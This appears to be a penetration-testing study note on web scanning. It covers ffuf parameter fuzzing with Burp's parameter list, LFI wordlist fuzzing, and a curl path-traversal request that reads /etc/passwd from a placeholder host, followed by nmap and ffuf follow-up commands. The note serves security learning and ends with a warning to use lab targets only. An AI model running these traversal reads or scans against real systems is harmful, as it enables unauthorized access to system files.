---
# 🛠️ Automated Scanning - Parameter Fuzzing (ffuf + burp-parameter-names.txt), LFI Wordlists (LFI-Jhaddix.txt), Server Discovery

> [!ABSTRACT] Overview of Automated Scanning Techniques
>
> This note covers the process of automated scanning using tools like ffuf for parameter fuzzing and [[burpsuite]]'s `burp-parameter-names.txt` list. It also includes using LFI wordlists such as `LFI-Jhaddix.txt` for server discovery.

---

## 🚦 Setting Up the Environment

> [!INFO] Preparing Tools and Wordlists
>
> Ensure you have [[ffuf]] installed and a comprehensive set of parameter names from `burp-parameter-names.txt`. Additionally, prepare an LFI wordlist such as `LFI-Jhaddix.txt`.

---

## 🔍 Initial Scanning with ffuf

### Step 1: Enumerate Parameters

```bash
ffuf -u http://target.com/login.php?FUZZ=FUZZ -w burp-parameter-names.txt
```

> [!CHECK] Verifying Parameter Enumeration
>
> Check the responses to identify parameters that might be vulnerable to LFI or other attacks.

### Step 2: Fuzzing with LFI Wordlists

```bash
ffuf -u http://target.com/include.php?file=FUZZ -w LFI-Jhaddix.txt
```

> [!SUCCESS] Identifying Vulnerable Paths
>
> If the server responds with unexpected files or directories, you have identified potential LFI vulnerabilities.

---

## 🔎 Analyzing Results

### Parameters Identified

```text
login.php?username=FUZZ&password=FUZZ
include.php?file=FUZZ
```

### Potential LFI Vulnerabilities

```text
/include/config.inc.php
/../../../../etc/passwd
```

> [!NOTE] Observations
>
> These paths and parameters indicate potential vulnerabilities that can be further explored.

---

## 🛠️ Exploiting Identified Vulnerabilities

### Step 1: Confirming LFI Exploitability

```bash
curl http://target.com/include.php?file=../../../../etc/passwd
```

> [!SUCCESS] Successful Retrieval of Sensitive Files
>
> If the server returns `/etc/passwd`, then an LFI vulnerability exists.

---

## ⚠️ Security Considerations

### Potential Risks

```text
- Unauthorized access to sensitive files.
- Disclosure of system configurations and credentials.
```

> [!WARNING] Do Not Exploit in Production Environments
>
> Ensure you only test on authorized targets within a controlled lab environment.

---

# 📑 Summary and Next Steps

## 🔍 Reviewing Findings

```text
- Document all identified parameters and potential vulnerabilities.
- Verify findings with further testing or manual verification methods.
```

### Follow-Up Actions

```bash
sudo nmap -sC -sV <target_ip>
ffuf -u http://target.com/index.php?FUZZ=FUZZ -w burp-parameter-names.txt
```

> [!TODO] Next Steps
>
> Perform deeper enumeration and exploit identified vulnerabilities if authorized.

---

## 📄 References

- [[ffuf]]
- [[burpsuite]] - Parameter names list (`burp-parameter-names.txt`)
- LFI wordlist (`LFI-Jhaddix.txt`)